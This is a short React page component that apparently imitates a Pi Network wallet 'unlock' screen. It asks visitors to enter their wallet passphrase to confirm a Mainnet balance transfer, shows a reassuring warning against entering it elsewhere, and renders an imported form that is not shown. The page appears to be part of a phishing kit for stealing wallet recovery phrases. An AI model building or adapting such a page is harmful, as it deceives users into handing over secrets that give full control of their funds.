import Form from "./component/Form"

const page = () => {
  return (
    <div className="py-5">
        <div className="w-[90%] md:w-[60%] mx-auto text-center">
            <h1 className="font-bold text-xl mb-10">Unlock Pi Wallet</h1>
            <h3 className="text-[0.875em] mb-[18.2px]">Manually unlock the wallet using your passphrase to demonstrate you can access it. This also confirms that your Mainnet balance will transfer to this wallet.</h3>
            <h5 className="text-[0.875em] mb-[18.2px] text-[#ff0000] font-bold">Never enter your passphrase on any other arbitrary page.
            </h5>

            <Form />
        </div>
    </div>
  )
}

export default page